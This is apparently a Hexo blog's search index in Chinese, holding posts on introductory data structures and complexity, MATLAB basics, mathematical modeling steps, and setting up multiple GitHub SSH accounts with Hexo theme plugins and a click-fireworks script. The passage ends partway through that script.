<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>数据结构和算法-day1</title>
      <link href="/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day1/"/>
      <url>/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day1/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1><span id="shu-ju-jie-gou-he-suan-fa-algorithm-xu-lun">数据结构和算法 （Algorithm）- 绪论</span><a href="#shu-ju-jie-gou-he-suan-fa-algorithm-xu-lun" class="header-anchor">#</a></h1><h2><span id="shu-ju-shi-ge-sha">数据是个啥？</span><a href="#shu-ju-shi-ge-sha" class="header-anchor">#</a></h2><p> &nbsp; &nbsp; &nbsp; 数据（data）是信息的载体，是对客观事物的符号化表示，它的含义极为广泛，包含了人们日穿生活中的各种信息在计算机内的表示，而<strong>数据元素</strong>则是数据的基本单位。</p><p><img src="http://photo.orsoon.com/JPG-180515/180515_42/k5oFKYNsQz_small.jpg" alt=""></p><h2><span id="shu-ju-jie-gou-ding-yi">数据结构定义</span><a href="#shu-ju-jie-gou-ding-yi" class="header-anchor">#</a></h2><p>&nbsp; &nbsp; &nbsp; &nbsp; 数据结构分为逻辑结构和物理结构，以及数据运算三方面内容，一起来愉快地学习它吧😭！</p><h3><span id="luo-ji-jie-gou-zhong-ji-chong-jie-gou-de-ji-ben-ding-yi">逻辑结构中几种结构的基本定义</span><a href="#luo-ji-jie-gou-zhong-ji-chong-jie-gou-de-ji-ben-ding-yi" class="header-anchor">#</a></h3><p>① 线性结构(1:1)：结构中的数据元素之间存在着一对一的关系，如表，栈，队列等。</p><p>② 树形结构(1:n)：结构中的数据元素之间存在着一对多的关系。</p><p>③ 图形结构(m:n)：结构中的数据元素之间存在着多对多的关系，图形结构也被称为网状结构。</p><p>④ 集合结构：集合结构中的数据元素之间的关系仅仅是”属于同一个集合”，这种结构中的元素关系极为松散，该结构较为少见。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 总体来说，根据数据元素之间存在的不同关系，数据结构可分为<strong>线性结构和非线性结构😱</strong>。</p><p><img src="https://i.loli.net/2018/10/07/5bb97795e5dd5.png" alt=""></p><h3><span id="luo-ji-jie-gou-zhong-de-wu-li-jie-gou">逻辑结构中的物理结构</span><a href="#luo-ji-jie-gou-zhong-de-wu-li-jie-gou" class="header-anchor">#</a></h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 数据的逻辑结构和数据的存储无关，对数据的操作主要依赖数据的存储，而数据在计算机中的存储表示即数据的存储结构可分为<strong>顺序存储</strong>和<strong>非顺序存储</strong>，但针对一些特殊应用，还有<strong>索引存储结构，散列存储（hash方法）结构</strong>等其他表示方法。</p><p>① <strong>顺序存储方法</strong>：把逻辑上相邻的数据元素储存在物理位置上也相邻的存储单元中，例如数组即是顺序存储方法。</p><p>② <strong>链式存储方法</strong>：逻辑上相邻的数组元素不要求其在物理位置上也相邻，通过附设的指针字段值来指示数据的逻辑关系，算法中的指针就是由链式存储结构实现的。</p><p>③ 索引存储方法：除建立存储结点信息外，还建立附加的索引表来标识结点的地址，索引表由若干索引项组成。 <strong>Dense Index（稠密索引）</strong>代表每个数据元素在索引表中均有一个索引项。<strong>Sparse Index（稀疏索引）</strong>，代表一个索引项对应一组数据元素，<a href="https://www.cnblogs.com/FreeFire/p/4329528.html" target="_blank" rel="noopener">参考链接</a>。</p><p>④ 散列存储方法（Hash方法）：散列是数组存储方式的一种发展，相比数组，散列的数据访问速度要高于数组，因为可以依据存储数据的部分内容找到数据在数组中的存储位置，进而能够快速实现数据的访问，理想的散列访问速度是非常迅速的，而不像在数组中的遍历过程，采用存储数组中内容的部分元素作为映射函数的输入，映射函数的输出就是存储数据的位置，这样的访问速度就省去了遍历数组的实现，因此<strong>时间复杂度可以认为为O(1)</strong>，而<strong>数组遍历的时间复杂度为O(n)</strong>，<a href="https://baike.baidu.com/item/%E6%95%A3%E5%88%97%E5%AD%98%E5%82%A8%E6%96%B9%E6%B3%95/9663463?fr=aladdin" target="_blank" rel="noopener">参考链接</a>。</p><h2><span id="chou-xiang-shu-ju-lei-xing-abstract-data-type-adt">抽象数据类型（Abstract Data Type，ADT）</span><a href="#chou-xiang-shu-ju-lei-xing-abstract-data-type-adt" class="header-anchor">#</a></h2><p> &nbsp; &nbsp; &nbsp; ADT 的定义：一个数学模型以及定义在该模型上的一组操作。描述数据结构的一种理论工具。</p><pre class=" language-bash"><code class="language-bash">ADT 抽象数据类型名称 <span class="token punctuation">{</span>数据对象：<span class="token operator">&lt;</span>数据对象定义<span class="token operator">></span>……数据关系：<span class="token operator">&lt;</span>逻辑关系定义<span class="token operator">></span>……操作集合：  操作名1：  <span class="token operator">&lt;</span>基本操作1初始条件描述<span class="token operator">></span>  <span class="token operator">&lt;</span>基本操作1操作结果描述<span class="token operator">></span>  ……  ……  操作名n：  <span class="token operator">&lt;</span>基本操作n初始条件描述<span class="token operator">></span>  <span class="token operator">&lt;</span>基本操作n操作结果描述<span class="token operator">></span><span class="token punctuation">}</span>ADT抽象数据类型名称</code></pre><p> &nbsp; &nbsp; &nbsp; ADT 的作用：抽象数据类型可以使我们更容易描述现实世界。例：用线性表描述学生成绩表，用树或图描述遗传关系。<strong>优点是拥有较强的重复性，灵活性，封装性。</strong></p><p> &nbsp; &nbsp; &nbsp; ADT 的关键特征：使用它的人可以只关心它的逻辑特征，不需要了解它的存储方式。定义它的人同样不必要关心它如何存储。</p><p> &nbsp; &nbsp; &nbsp; 例如：线性表这样的抽象数据类型，其数学模型是：<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%85%83%E7%B4%A0" target="_blank" rel="noopener">数据元素</a>的集合，该集合内的元素有这样的关系：除第一个和最后一个外，每个元素有唯一的前趋和唯一的后继。可以有这样一些操作：插入一个元素、删除一个元素等。</p><p> &nbsp; &nbsp; &nbsp; <strong>从抽象数据类型的角度看，数据结构是ADT的物理实现。</strong></p><h2><span id="suan-fa-de-fu-za-du">算法的复杂度</span><a href="#suan-fa-de-fu-za-du" class="header-anchor">#</a></h2><p> &nbsp; &nbsp; &nbsp; 算法的复杂度通常分为时间复杂度，空间复杂度，采用<strong>“大O表示法”</strong>定义算法效率度量。</p><h3><span id="shi-jian-fu-za-du">时间复杂度</span><a href="#shi-jian-fu-za-du" class="header-anchor">#</a></h3><p> &nbsp; &nbsp; &nbsp; 判定算法性能的一个基本考虑是处理一定<strong>“规模（Size）”</strong>的输入时，该算法所需执行的<strong>“基本操作数（Basic Operation）”。</strong></p><p> &nbsp; &nbsp; &nbsp; T(N) = O(f(N))是指保证函数T(N)以不快于f(N)速度增长；f(N)是一个上界（upper bound），即某个算法的增长率最差情况是f(N)，给出几个例子：</p><pre class=" language-c"><code class="language-c"><span class="token number">1</span><span class="token punctuation">.</span> <span class="token punctuation">{</span> <span class="token operator">++</span>x<span class="token punctuation">;</span>s<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//1.算法时间复杂度为 O(1),称为常量阶</span><span class="token number">2</span><span class="token punctuation">.</span> <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token operator">++</span>x<span class="token punctuation">;</span>s<span class="token operator">+</span><span class="token operator">=</span>x<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//2.算法时间复杂度为 O(n),称为线性阶</span><span class="token number">3</span><span class="token punctuation">.</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span>i<span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>k<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token operator">++</span>x<span class="token punctuation">;</span>        s<span class="token operator">+</span><span class="token operator">=</span>x<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//3.算法时间复杂度为 O(n*n),称为平方阶</span><span class="token number">4</span><span class="token punctuation">.</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">)</span><span class="token punctuation">{</span> i<span class="token operator">=</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//4.算法时间复杂度为 O(log2n),称为对数阶</span><span class="token comment" spellcheck="true">//根据基本执行次数，运用极限的方法来计算复杂度</span></code></pre><h3><span id="kong-jian-fu-za-du">空间复杂度</span><a href="#kong-jian-fu-za-du" class="header-anchor">#</a></h3><p> &nbsp; &nbsp; &nbsp; 一个程序的空间复杂度是指从程序运行到结束所需的存储量。而程序的存储空间分为固定部分和可变部分，就像电脑分了硬盘存储空间和内存存储空间一样😄，程序本身所占的物理空间加上程序运行时所需要的内存组成了程序运行所需的存储空间。</p><p>Try to get the best answer！</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数学建模-day2</title>
      <link href="/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day2/"/>
      <url>/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day2/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1><span id="shu-xue-jian-mo-day2-matlab-ji-ben-yong-fa">数学建模_day2 – matlab 基本用法</span><a href="#shu-xue-jian-mo-day2-matlab-ji-ben-yong-fa" class="header-anchor">#</a></h1><p><img src="https://i.loli.net/2018/10/07/5bb957ec92262.png" alt=""><br>&nbsp; &nbsp; &nbsp; &nbsp; matlab 整体界面如上图，在matlab中一般需要创建变量，调用函数，定义变量和 python 类似，<strong>如果没有定义输出变量，matlab则会使用一个名为ans的变量存储计算结果。</strong></p><p> &nbsp; &nbsp; &nbsp; matlab主要被用来对整个矩阵或者数组进行操作。</p><h3><span id="yi-na-me-ru-he-lai-jin-xing-shu-zu-de-chuang-jian-ni">一. 那么如何来进行数组的创建呢：</span><a href="#yi-na-me-ru-he-lai-jin-xing-shu-zu-de-chuang-jian-ni" class="header-anchor">#</a></h3><ul><li><p>随便创建一个一维数组 a= [1 2 3 4],也可称作单行矩阵或行向量</p><p><img src="https://i.loli.net/2018/10/07/5bb959beb45e8.png" alt=""></p></li><li><p>创建多行矩阵则用分号分开</p><p><img src="https://i.loli.net/2018/10/07/5bb95a474bb84.png" alt=""></p></li></ul><h3><span id="er-yong-han-shu-dui-ju-zhen-he-shu-zu-jin-xing-yi-xie-cao-zuo">二. 用函数对矩阵和数组进行一些操作：</span><a href="#er-yong-han-shu-dui-ju-zhen-he-shu-zu-jin-xing-yi-xie-cao-zuo" class="header-anchor">#</a></h3><ul><li><p>sin,cos,tan,cot等函数都能使用:</p><p><img src="https://i.loli.net/2018/10/07/5bb95b8054e4c.png" alt=""></p></li><li><p>矩阵的加减乘除以及转置（共轭转置为 b’ ,非共轭转置为运算 b.’对于实数没有区别) ,人性化的报错😄好评：</p><p><img src="https://i.loli.net/2018/10/07/5bb95c2d99dcf.png" alt=""></p></li><li><p>矩阵求逆运算 inv 函数：</p><p><img src="https://i.loli.net/2018/10/07/5bb95d8d1797d.png" alt=""></p></li><li><p>格式化输出 format short(long)：</p><p><img src="https://i.loli.net/2018/10/07/5bb95e3e30a1b.png" alt=""></p></li><li><p>矩阵每一个元素的平方（s.*s)，立方(s.^3)操作：</p><p><img src="https://i.loli.net/2018/10/07/5bb95ed30a03c.png" alt=""></p></li><li><p>矩阵的扩充操作：</p><p><img src="https://i.loli.net/2018/10/07/5bb95f5d5a4e8.png" alt=""></p><h3><span id="san-gong-zuo-kong-jian-bian-liang">三. 工作空间变量</span><a href="#san-gong-zuo-kong-jian-bian-liang" class="header-anchor">#</a></h3></li><li><p>magic 和 rand ，以及whos命令</p><p>magic是一种用于产生魔方矩阵的函数，产生的矩阵的每行、列以及对角线的数之和相等。该和的值为1+2+3+…..+n^2的和再除以n，n必须为大于或等于3的整数。 </p><p>rand函数则用于产生由在(0, 1)之间均匀分布的随机数组成的数组 ，如rand（4）则是产生一个1行4列的数组，rand（2，3）则是2行3列矩阵，rand（2，3，4）则是四个2行3列的矩阵</p><p><img src="https://i.loli.net/2018/10/07/5bb961e66a53f.png" alt=""></p></li><li><p>save，load，clear 命令。save用于保存数据到 mat文件中，load用于加载mat文件，clear则是清除当前工作区变量。</p><p><img src="https://i.loli.net/2018/10/07/5bb9628c75d19.png" alt=""></p></li></ul><h3><span id="si-zi-fu-he-zi-fu-chuan-cao-zuo">四. 字符和字符串操作</span><a href="#si-zi-fu-he-zi-fu-chuan-cao-zuo" class="header-anchor">#</a></h3><ul><li><p>定义字符和字符串：</p><p><img src="https://i.loli.net/2018/10/07/5bb963f2ec434.png" alt=""></p></li><li><p>数字转字符，字符拼接（int2str or num2str函数）：</p><p><img src="https://i.loli.net/2018/10/07/5bb965001606c.png" alt=""></p><h3><span id="wu-diao-yong-han-shu">五. 调用函数</span><a href="#wu-diao-yong-han-shu" class="header-anchor">#</a></h3></li><li><p>matlab 和大多数编程语言一样，提供了很多函数来简化代码提高效率，例如常见的 min，max函数，且函数同样具有返回值类型，个数等条件:</p><p><img src="https://i.loli.net/2018/10/07/5bb9674e3f44e.png" alt=""></p></li><li><p>zeros，ones 函数，生成特定矩阵（全零或者全一）：</p><p><img src="https://i.loli.net/2018/10/07/5bb967c6a83a3.png" alt=""></p></li><li><p>size，sum函数，size用于计算大小，如矩阵的行列数，sum则用于求和，两者传参有相似之处：</p><p><img src="https://i.loli.net/2018/10/07/5bb968c8cee9a.png" alt=""></p></li></ul><p>  <img src="https://i.loli.net/2018/10/07/5bb9687d4ff42.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数学建模_day1</title>
      <link href="/2018/10/06/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day1/"/>
      <url>/2018/10/06/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day1/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1><span id="shu-xue-jian-mo-day1-chu-ru-shu-mo">数学建模_day1–初入数模</span><a href="#shu-xue-jian-mo-day1-chu-ru-shu-mo" class="header-anchor">#</a></h1><p>&nbsp; &nbsp; &nbsp; &nbsp; 作为一个大二刚开始的学生才真正接触数模，虽然有点晚了，但我相信有付出，就有回报，没有付出就没有馅饼😄。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 数学建模是什么东西呢？简单来说就是通过数学的符号和语言作表述来建立数学模型，而此数学模型首先是根据实际问题建立的，通过这个建立的数学模型，我们可以去解决一个实际的问题，如共享单车，城市排污等等问题。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 数学建模的过程包括表述，求解，解释，检验四个过程。可细分为七个步骤：模型准备，模型假设，模型构成，模型求解，模型分析，模型检验，模型应用。</p><h3><span id="1-mo-xing-zhun-bei">1.模型准备</span><a href="#1-mo-xing-zhun-bei" class="header-anchor">#</a></h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 作为建模的第一步，我们首先应该了解给出的那个问题的实际背景，再明确建模的目的，从而可以针对性地搜集有关的信息，掌握模型对象的特征之后，在我们脑海中形成一个比较清晰的问题。比如共享单车的投放问题，面对这个问题我们首先就知道了需要得出一个合理的投放量，那么我们就需要从多方面来获取信息，如各地人口数量，交通情况，以及基础设施完善程度等等信息，来丰富这个模型的特征，进而建立出合理的模型来解决共享单车的投放问题。<br><img src="https://i.loli.net/2018/10/06/5bb8d2dd91a08.png" alt=""></p><h3><span id="2-mo-xing-jia-she">2.模型假设</span><a href="#2-mo-xing-jia-she" class="header-anchor">#</a></h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 在模型假设这一步中，很明显你建立出来的模型是否合理取决于它的可用性，针对问题的特点和建模目的，要做出最合理的模型假设，怎么个合理法呢？那就是要符合实际情况，如物质成本，时间成本，空间成本等等条件。<br><img src="https://i.loli.net/2018/10/06/5bb8d3068e279.png" alt=""></p><h3><span id="3-mo-xing-gou-cheng">3.模型构成</span><a href="#3-mo-xing-gou-cheng" class="header-anchor">#</a></h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 模型的构成就需要我们好好讲究了，正所谓讲究而不将就，如何在实际情况与构成难度之间做出最合适的表达也是一门艺术。这一步我们需要尽量采用简单普遍的数学工具来构成模型。<br><img src="https://i.loli.net/2018/10/06/5bb8d31f817e6.png" alt=""></p><h3><span id="4-mo-xing-qiu-jie">4.模型求解</span><a href="#4-mo-xing-qiu-jie" class="header-anchor">#</a></h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 通过各种数学方法，软件（matlab，mathematical，lingo），以及计算机编程技术，来对模型进行高效率地求解。</p><h3><span id="5-mo-xing-fen-xi">5.模型分析</span><a href="#5-mo-xing-fen-xi" class="header-anchor">#</a></h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 对求出来的结果进行误差分析，统计分析，以及模型对数据的稳定性分析（机器学习也有涉及：1. 计算的稳定性(Computational Stability)；2. 数据稳定性；3. 性能的稳定性 [参考链接]: <a href="https://blog.csdn.net/zhouwenyuan1015/article/details/78228818）" target="_blank" rel="noopener">https://blog.csdn.net/zhouwenyuan1015/article/details/78228818）</a></p><h3><span id="6-mo-xing-jian-yan">6.模型检验</span><a href="#6-mo-xing-jian-yan" class="header-anchor">#</a></h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 数学讲究一个严谨，因而在模型求解之后进行检验那是必然的。我们需要将解出来的数据与实际现象，现实数据比较，从而检验模型的合理性。</p><h3><span id="7-mo-xing-ying-yong">7.模型应用</span><a href="#7-mo-xing-ying-yong" class="header-anchor">#</a></h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 当模型能够得到应用时，说明这是个成熟的模型了，该学会自己解决问题了（脑补 成熟的模型.jpg😄)。</p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>多Git账户以及Hexo搭建博客进阶</title>
      <link href="/2018/10/06/%E5%A4%9AGit%E8%B4%A6%E6%88%B7%E4%BB%A5%E5%8F%8AHexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6/"/>
      <url>/2018/10/06/%E5%A4%9AGit%E8%B4%A6%E6%88%B7%E4%BB%A5%E5%8F%8AHexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1><span id="duo-git-zhang-hu-yi-ji-hexo-da-jian-bo-ke-jin-jie">多Git账户以及Hexo搭建博客进阶</span><a href="#duo-git-zhang-hu-yi-ji-hexo-da-jian-bo-ke-jin-jie" class="header-anchor">#</a></h1><h2><span id="1-sheng-cheng-mi-yao">1.生成密钥</span><a href="#1-sheng-cheng-mi-yao" class="header-anchor">#</a></h2><p><img src="https://i.loli.net/2018/10/04/5bb631dc309a8.png" alt=""></p><p>可以看到已经生成的id_rsa是0LinkSec git账户的密钥</p><p>而yof3ng的则是我准备搭建的第二个hexo的密钥</p><h2><span id="2-pei-zhi-config-wen-jian">2.配置config文件</span><a href="#2-pei-zhi-config-wen-jian" class="header-anchor">#</a></h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#userName1(yof3ng@gmail.com)0LinkSec Lab</span>Host 0LinkSecHostName github<span class="token punctuation">.</span>comPreferredAuthentications publickeyIdentityFile <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa<span class="token comment" spellcheck="true">#userName2 yof3ng@qq.com</span>Host yof3ngHostName github<span class="token punctuation">.</span>comPreferredAuthentications publickeyIdentityFile <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>yof3ng</code></pre><p>需要注意的是缩进问题，缩进可能会产生报错。</p><p>在github上添加完ssh密钥之后即可进行下一步</p><h2><span id="3-git-lian-jie-ce-shi">3.git连接测试</span><a href="#3-git-lian-jie-ce-shi" class="header-anchor">#</a></h2><p>第一个账户git@0LinkSec：</p><p><img src="https://i.loli.net/2018/10/04/5bb632d0def6c.png" alt=""></p><p>第二个账户git@yof3ng：</p><p><img src="https://i.loli.net/2018/10/04/5bb632ecc2c9c.png" alt=""></p><p>两个账户已经建立成功，接下来即可进行第二个hexo的搭建。</p><h2><span id="4-di-er-ge-hexo-chu-shi-hua-hou-pei-zhi-config-wen-jian">4.第二个hexo初始化后配置 config文件</span><a href="#4-di-er-ge-hexo-chu-shi-hua-hou-pei-zhi-config-wen-jian" class="header-anchor">#</a></h2><p><img src="https://i.loli.net/2018/10/04/5bb6376eaf144.png" alt=""></p><p>强调repository项：应该设置为前面设置的第二用户,若为<a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>则会默认为第一用户，连接0LinkSec。</p><p>到此第二hexo搭建成功。</p><h2><span id="5-souce-mu-lu-xia-cname-wen-jian-jian-li-yi-ji-yu-ming-cname-ji-lu-jian-li">5.souce目录下CNAME文件建立，以及域名CNAME记录建立</span><a href="#5-souce-mu-lu-xia-cname-wen-jian-jian-li-yi-ji-yu-ming-cname-ji-lu-jian-li" class="header-anchor">#</a></h2><p>新建yof3ng二级域名CNAME记录，指向 yof3ng.github.io,以及在hexo根目录下的source文件夹建立CNAME文件，将yof3ng.0Link.top填入其中即可。</p><p><img src="https://i.loli.net/2018/10/05/5bb76525ca26d.png" alt=""></p><h2><span id="6-kai-qi-qiang-zhi-https-fu-wu-xuan-xiang">6.开启强制https服务选项</span><a href="#6-kai-qi-qiang-zhi-https-fu-wu-xuan-xiang" class="header-anchor">#</a></h2><p>在github 对应仓库中的setting中设置即可。</p><h2><span id="7-tian-jia-meng-chong-jing-ling">7.添加萌宠精灵</span><a href="#7-tian-jia-meng-chong-jing-ling" class="header-anchor">#</a></h2><p><a href="https://blog.csdn.net/Aoman_Hao/article/details/82049821" target="_blank" rel="noopener">参考</a>链接</p><p>切换到博客目录然后输入：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#安装live2d</span>npm install <span class="token operator">-</span><span class="token operator">-</span>save hexo<span class="token operator">-</span>helper<span class="token operator">-</span>live2d<span class="token comment" spellcheck="true">#安装萌宠module</span>npm install live2d<span class="token operator">-</span>widget<span class="token operator">-</span>model<span class="token operator">-</span>koharu </code></pre><p>添加在config文件内：</p><pre class=" language-shell"><code class="language-shell">live2d:  enable: true  scriptFrom: local  model:    use: live2d-widget-model-koharu  display:    position: right    width: 140    height: 260  mobile:    show: true</code></pre><p><img src="https://i.loli.net/2018/10/06/5bb847f7047c9.png" alt=""></p><h2><span id="8-tian-jia-shu-biao-dian-ji-te-xiao">8.添加鼠标点击特效</span><a href="#8-tian-jia-shu-biao-dian-ji-te-xiao" class="header-anchor">#</a></h2><p>添加鼠标点击爆炸效果：<br>在主题的js目录下创建fireworks.js并写入如下代码</p><pre class=" language-javascript"><code class="language-javascript"><span class="token string">"use strict"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>pointerX<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>clientX<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientX<span class="token punctuation">)</span><span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>left<span class="token punctuation">,</span>pointerY<span class="token operator">=</span>e<span class="token punctuation">.</span>clientY<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientY<span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>top<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> t<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">360</span><span class="token punctuation">)</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token operator">/</span><span class="token number">180</span><span class="token punctuation">,</span>a<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">{</span>x<span class="token punctuation">:</span>e<span class="token punctuation">.</span>x<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">cos</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span>e<span class="token punctuation">.</span>y<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span>colors<span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>colors<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>endPos<span class="token operator">=</span><span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span><span class="token string">"#F00"</span><span class="token 